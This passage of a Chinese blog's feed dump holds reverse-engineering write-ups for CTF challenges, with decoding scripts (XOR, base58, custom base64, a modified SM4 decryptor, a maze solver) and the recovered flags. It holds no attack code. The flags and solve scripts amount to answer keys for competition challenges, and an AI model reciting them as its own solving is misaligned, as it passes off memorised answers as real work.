class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int v2;</span><br><span class="line">__int64 a1;</span><br><span class="line">int i; </span><br><span class="line">char ch;</span><br><span class="line">v2&#x3D;0xBD46588;</span><br><span class="line">a1&#x3D;(__int64)(0x1d7ccbb80^0xBD46588^0x235FFFA864 ^ 0x67B7940F53);</span><br><span class="line"></span><br><span class="line">for(i&#x3D;0;i&lt;5;i++)</span><br><span class="line">&#123;</span><br><span class="line">ch&#x3D;a1&gt;&gt;((4-i)*8)&amp;0xff;</span><br><span class="line">putchar(ch);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;E4sy?</span><br></pre></td></tr></table></figure><p>接下来就是两个secret<br><img src="https://i.loli.net/2021/06/04/aRCmtqBP5grxSp8.png"><br>secret1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import base58</span><br><span class="line"></span><br><span class="line">code&#x3D;&#39;ZoJPRqxMfvzxNqu&#39;</span><br><span class="line"></span><br><span class="line">table1&#x3D;&#39;ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789&#39;</span><br><span class="line">table2&#x3D;&#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#39;</span><br><span class="line">code2&#x3D;&#39;&#39;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(code)):</span><br><span class="line">    for j in range(len(table1)):</span><br><span class="line">        if code[i]&#x3D;&#x3D;table1[j]:</span><br><span class="line">            code2+&#x3D;table2[j]</span><br><span class="line">            break</span><br><span class="line">#print(code2)</span><br><span class="line">flag&#x3D;base58.b58decode(code2)</span><br><span class="line">print(flag)</span><br><span class="line">#_Up_t0_Y0u!</span><br></pre></td></tr></table></figure><p>secret2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">str1 &#x3D;&#39;ITFDNG5nejSVfUFcfGssbjVcIR&#x3D;&#x3D;&#39;</span><br><span class="line">string1 &#x3D; &#39;ABCDEFGHIJKMNLOPRSTUVQWYXZabefghicdjklmnopqtuvwrsxyz0123456789+&#x2F;&#39;</span><br><span class="line">string2 &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(str1.translate(str.maketrans(string1, string2))))</span><br><span class="line">#!!C0ngr4Tu1atl0n5!!</span><br></pre></td></tr></table></figure><p>得到<code>flag&#123;Eys4?_Up_t0_Y0u!!!C0ngr4Tu1atl0n5!!&#125;</code></p><h2 id="Qsay"><a href="#Qsay" class="headerlink" title="Qsay"></a>Qsay</h2><p>文件有3个，一个key，一个dll，一个exe。根据后面分析dll可以知道key是sm4的key，exe是密文，32个字节，dll是sm4加密过程，可以用findcryto插件找到特征值。</p><p>定位到加密函数，发现。<br><img src="https://i.loli.net/2021/06/05/zFfeGm2INA5t97w.png"><br>感觉用了平坦化控制流，但是用delat.py没去掉，然后直接用sm4脚本解，解不出来，怀疑魔改了数据。去看数据，一对比，确实魔改了。<br><img src="https://i.loli.net/2021/06/05/lAWD1Lq32Fmihgo.png"><br>然后用自己之前写的sm4脚本解密，也可以用GitHub上的<a href="https://github.com/Leeyuxun/C-SM4">https://github.com/Leeyuxun/C-SM4</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned int FK[4] &#x3D; &#123;</span><br><span class="line">0xa3b1bac6,</span><br><span class="line">0x56aa3350,</span><br><span class="line">0x677d9197,</span><br><span class="line">0xb27022dc</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;******************************定义固定参数CK的取值****************************************&#x2F;</span><br><span class="line">unsigned int CK[32] &#x3D; &#123;</span><br><span class="line"></span><br><span class="line">0x00070e15,0x1c232a31,0x383f464d,0x545b6269,</span><br><span class="line">0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,</span><br><span class="line">0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,</span><br><span class="line">0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,</span><br><span class="line">0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,</span><br><span class="line">0x30373e45,0x4c535a61,0x686f787d,0x848b9299,</span><br><span class="line">0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,</span><br><span class="line">0x10171e25,0x2c333a41,0x484f565d,0x646b7279</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;******************************SBox参数列表****************************************&#x2F;</span><br><span class="line">unsigned char SBOX[256] &#x3D; &#123;</span><br><span class="line"></span><br><span class="line">   0xC6,0x90,0xe9,0xfe,0xcc,0xe1,0x3F,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,</span><br><span class="line">0x2b,0x67,0x9a,0x76,0x2C,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,</span><br><span class="line">0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,</span><br><span class="line">0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,</span><br><span class="line">0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,</span><br><span class="line">0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,</span><br><span class="line">0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,</span><br><span class="line">0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,</span><br><span class="line">0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,</span><br><span class="line">0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,</span><br><span class="line">0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,</span><br><span class="line">0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,</span><br><span class="line">0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,</span><br><span class="line">0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,</span><br><span class="line">0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,</span><br><span class="line">0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void long_to_char(unsigned int in ,unsigned char *out)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        out[i]&#x3D;(unsigned char)(in&gt;&gt;(24-i*8))&amp;0xff;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void char_to_long(unsigned char *in , unsigned int *out)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    *out&#x3D;0;</span><br><span class="line">    for(i&#x3D;0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *out &#x3D; (unsigned int)in[i]&lt;&lt;(24-8*i)|(*out);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int left_move(unsigned int a,int lenth)</span><br><span class="line">&#123;</span><br><span class="line">    a&#x3D;(a&lt;&lt;lenth) | a&gt;&gt;(32-lenth);</span><br><span class="line">    return a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int date_round(unsigned int tmp)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    unsigned char arr[4]&#x3D;&#123;0&#125;;</span><br><span class="line">    long_to_char(tmp,arr);</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arr[i]&#x3D;SBOX[arr[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    char_to_long(arr,&amp;tmp);</span><br><span class="line">    tmp &#x3D; tmp ^ left_move(tmp, 2) ^ left_move(tmp, 10) ^ left_move(tmp, 18) ^ left_move(tmp, 24);</span><br><span class="line"></span><br><span class="line">    return tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void sm4_encode(unsigned char *plain,unsigned int sub_key[],unsigned char out[])</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    unsigned int date[36];</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        char_to_long(plain+i*4,date+i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        date[i+4]&#x3D;date[i]^date_round(date[i+1]^date[i+2]^date[i+3]^sub_key[i+4]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        long_to_char(date[35-i],out+i*4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void sm4_decode(unsigned char *code,unsigned int sub_key[],unsigned char out[])</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    unsigned int date[36];</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        char_to_long(code+i*4,date+i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        date[i+4]&#x3D;date[i]^date_round(date[i+1]^date[i+2]^date[i+3]^sub_key[35-i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        long_to_char(date[35-i],out+i*4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int key_round(unsigned int tmp)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    unsigned char arr[4]&#x3D;&#123;0&#125;;</span><br><span class="line">    long_to_char(tmp,arr);</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arr[i]&#x3D;SBOX[arr[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    char_to_long(arr,&amp;tmp);</span><br><span class="line">    tmp &#x3D; tmp ^ left_move(tmp, 13) ^ left_move(tmp, 23);</span><br><span class="line">    return tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void extendkey(unsigned char key[],unsigned int sub_key[])</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        char_to_long(key+i*4,sub_key+i);</span><br><span class="line">        sub_key[i]^&#x3D;FK[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sub_key[i+4]&#x3D;sub_key[i] ^ key_round(sub_key[i+1] ^ sub_key[i+2] ^ sub_key[i+3] ^ CK[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char key[16] &#x3D;&#123;0x4D, 0x4C, 0x7B, 0x4F, 0xAB, 0x6B, 0x78, 0x09, 0xE6, 0x27, 0xFA,</span><br><span class="line">0x9D, 0xA6, 0xC6, 0x4E, 0x8A &#125;;</span><br><span class="line">    unsigned char code[32]&#x3D;&#123;0xAF, 0xD3, 0xD5, 0x71, 0x1F, 0xC6, 0xA3, 0x42, 0xC5, 0x64, </span><br><span class="line">  0x53, 0x2E, 0xFE, 0x13, 0xF1, 0xA3,0x0F, 0x96, 0x0A, 0x0B, 0x1D, 0x3D, 0x83, 0x33, 0x2A, 0x4B,</span><br><span class="line">0x71, 0x98, 0x10, 0xFF, 0x70, 0x43&#125;;</span><br><span class="line">    unsigned int sub_key[36]&#x3D;&#123;0&#125;;    </span><br><span class="line">    unsigned char out[32];</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    extendkey(key,sub_key);</span><br><span class="line"></span><br><span class="line">    sm4_decode(code,sub_key,out);</span><br><span class="line">    sm4_decode(&amp;code[16],sub_key,&amp;out[16]);</span><br><span class="line">    for(i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,out[i]);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#x2F;&#x2F;newsctf&#123;QSay1ts-1nTereStingObf&#125;</span><br></pre></td></tr></table></figure><h2 id="开门啊-1"><a href="#开门啊-1" class="headerlink" title="开门啊-1"></a>开门啊-1</h2><p>apk还是做少了，逻辑看起都费劲，看wp学习了一下。而且想jeb动调来着，结果不知道什么原因，程序老是闪退，也不知道是不是Android环境不对。</p><p>分析主函数<br><img src="https://i.loli.net/2021/06/05/qtmzhpgSIbxjP42.png"><br>分析tom1函数<br><img src="https://i.loli.net/2021/06/05/fvh1SbzCeyBumiQ.png">、</p><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int flag[20]&#x3D;&#123;0x7A, 0x74, 0x7F, 0x79, -123, 0x4F, 74, 76, 71, 72, 77, 75, 74, 73, 76, 74, 76, 77, 76, -125&#125;;</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;0;i&lt;20;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]&#x3D;(flag[i]^15)-15;</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;flag&#123;16498356746434&#125; </span><br></pre></td></tr></table></figure><h2 id="开门啊-2"><a href="#开门啊-2" class="headerlink" title="开门啊-2"></a>开门啊-2</h2><p>不知道为什么，so文件和wp的函数伪代码差距也太大了吧，不做了，杀鸡去了，嘿嘿嘿。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X BUUOJ 五月 re wp</title>
      <link href="2021/05/30/DASCTF%20X%20BUUOJ%20%E4%BA%94%E6%9C%88%20re%20wp/"/>
      <url>2021/05/30/DASCTF%20X%20BUUOJ%20%E4%BA%94%E6%9C%88%20re%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF-X-BUUOJ-五月-re-wp"><a href="#DASCTF-X-BUUOJ-五月-re-wp" class="headerlink" title="DASCTF X BUUOJ 五月 re wp"></a>DASCTF X BUUOJ 五月 re wp</h1><p>最近比赛挺多的，做得来的也就das了，哈哈哈，太菜了，后面其他比赛看看有没有wp，然后复现一下吧。</p><h2 id="PaperPlease"><a href="#PaperPlease" class="headerlink" title="PaperPlease"></a>PaperPlease</h2><p>就一个字符串解密<br><img src="https://i.loli.net/2021/05/30/3iD26KU1uAB4NIr.png"><br>python脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a&#x3D;[ 0x56, 0x05, 0x53, 0x52, 0x04, 0x03, 0x53, 0x54, 0x04, 0x0B,</span><br><span class="line">  0x53, 0x51, 0x06, 0x06, 0x0F, 0x55, 0x05, 0x5B, 0x03, 0x56,</span><br><span class="line">  0x0E, 0x07, 0x57, 0x0E, 0x01, 0x0D, 0x56, 0x00, 0x04, 0x06,</span><br><span class="line">  0x0A, 0x5D,]</span><br><span class="line">s&#x3D;&#39;5c715207e3abed7dfb7c8ea9c82d0e29&#39;</span><br><span class="line">print(&quot;DASCTF&#123;&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    print(chr(ord(s[i])^a[i]),end&#x3D;&#39;&#39;)</span><br><span class="line">print(&quot;&#125;&quot;)</span><br><span class="line">#DASCTF&#123;cfdc11cca823cb81c9456b67b5dd4c8d&#125;</span><br></pre></td></tr></table></figure><h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2><p>先upx脱壳，然后分析一下发现是个迷宫加md5加密<br><img src="https://i.loli.net/2021/05/30/lnJXueYTtr7zbjw.png"></p><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">&#x2F;&#x2F;上8 下2 左4 右6</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;sdssddwddsssaassddd</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int map[56]&#x3D;&#123;0x0000005e,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000001,0x00000000,0x00000001,0x00000001,0x00000001,0x00000000,0x00000000,0x00000001,0x00000001,0x00000001,0x00000000,0x00000001,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000001,0x00000000,0x00000001,0x00000000,0x00000000,0x00000001,0x00000001,0x00000001,0x00000000,0x00000001,0x00000000,0x00000000,0x00000001,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000001,0x00000001,0x00000001,0x00000023&#125;;</span><br><span class="line">  char path[]&#x3D;&quot;sdssddwddsssaassddd&quot;;</span><br><span class="line">  int flag[20]&#x3D;&#123;0&#125;;</span><br><span class="line">  int num;</span><br><span class="line">  char Buffer[20];</span><br><span class="line">  int i;</span><br><span class="line">  for(i&#x3D;0;i&lt;56;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  printf(&quot;%02d &quot;,map[i]);</span><br><span class="line">  if((i+1)%7&#x3D;&#x3D;0)</span><br><span class="line">  &#123;</span><br><span class="line">  printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  for(i&#x3D;0;i&lt;20;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  switch(path[i])</span><br><span class="line">  &#123;</span><br><span class="line">  case &#39;w&#39;:</span><br><span class="line">  flag[i]&#x3D;8;</span><br><span class="line">  printf(&quot;8&quot;);</span><br><span class="line"> break;</span><br><span class="line">  case &#39;s&#39;:</span><br><span class="line">  flag[i]&#x3D;2;</span><br><span class="line">  printf(&quot;2&quot;);</span><br><span class="line"> break;</span><br><span class="line">  case &#39;a&#39;:</span><br><span class="line">  flag[i]&#x3D;4;</span><br><span class="line">  printf(&quot;4&quot;);</span><br><span class="line"> break;</span><br><span class="line">  case &#39;d&#39;:</span><br><span class="line">  flag[i]&#x3D;6;</span><br><span class="line">  printf(&quot;6&quot;);</span><br><span class="line"> break;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;0;i&lt;20;i++)</span><br><span class="line">&#123;</span><br><span class="line">num+&#x3D;flag[i];</span><br><span class="line">&#125;</span><br><span class="line">sprintf(Buffer, &quot;%d&quot;, num);</span><br><span class="line">printf(&quot;\n%s&quot;,Buffer);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;md5(80)</span><br></pre></td></tr></table></figure><p>得到f033ab37c30201f73f142449d037028d</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>川传ctf线上 re wp</title>
      <link href="2021/05/27/%E5%B7%9D%E4%BC%A0ctf%E7%BA%BF%E4%B8%8A%20%20re%20wp/"/>
      <url>2021/05/27/%E5%B7%9D%E4%BC%A0ctf%E7%BA%BF%E4%B8%8A%20%20re%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="川传ctf-wp"><a href="#川传ctf-wp" class="headerlink" title="川传ctf wp"></a>川传ctf wp</h1><p>上午还在军训，只做了3个小时，做了一半的re，没做完题，有点小难受吧。</p><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>jd-gui打开</p><p>简单的两个base64解密，做二维数组的row和rol<br><img src="https://i.loli.net/2021/05/24/uga1inhEPFZVLeq.png"><br>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int s[18][18]&#x3D;&#123; </span><br><span class="line">        &#123; </span><br><span class="line">          99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 